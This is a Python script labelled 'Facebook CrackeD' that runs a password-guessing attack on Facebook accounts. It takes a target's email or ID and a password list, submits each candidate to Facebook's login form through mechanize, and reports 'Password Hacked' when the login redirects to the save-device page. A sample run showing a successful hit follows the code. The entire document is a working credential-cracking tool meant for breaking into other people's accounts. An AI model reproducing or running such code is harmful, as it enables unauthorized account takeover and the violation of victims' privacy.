# Facebook CrackeD
import sys
import os
try:
	import mechanize
except:
	os.system('pip install mechanize')
import mechanize
import time
#result = pyfiglet.figlet_format("FACHACK", font = "letters" ) 

P="\033[0;35m"
G='\033[0;32m'
R="\033[0;31m"
os.system('clear')
print(R)
print(P+f'''

 █▀▀▀ █▀▀█ █▀▀█ ── █─░█ █▀▀█ █▀▀█ █─▄▀           
 █▀▀▀ █▄▄█ █─── ▀▀ █▀▀█ █▄▄█ █─── █▀▄─           
 █─── █─░█ █▄▄█ ── █─░█ █─░█ █▄▄█ █─ █         
 
 {R}Facebook: Issam Iso
 Reach out to me if I made mistakes ''')
print(R+'-'*50)
def facebook(url,user_agent):
	user=input(G+f'Enter Email OR ID :{P} ')
	files=input(G+f'Enter The List Password :{P} ')
	file=open(files,"r").readlines()
	for i in file:
		i=i.strip()
		browser=mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders=[("User-Agent",user_agent)]
		browser.open(url)
		browser.select_form(nr=0)
		browser.form["email"] = user
		browser.form["pass"] = i
		finall=browser.submit()
		respons=finall.geturl()
		if "save-device" in respons:
			print(P+'-'*50)
			print(R+'Password Hacked --> {}{} '.format(P,i))
			print(P+'-'*50)
			break
		if "m_lara_first_password_failure" in respons:
			print(P+'Failed Password --> {}'.format(i))
		else:
			print(P+'Failed Password --> {}'.format(i))
__url__="https://www.facebook.com/login.php"
__user_agent__="Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
try:
	facebook(__url__,__user_agent__)
except:
	sys.exit()




'''
Enter Email OR ID : xxxxxxxx@gmail.com
Enter The List Password : password.txt
https://m.facebook.com/login/save-device/?login_source=login&refsrc=deprecated&_rdr#_=_
'''
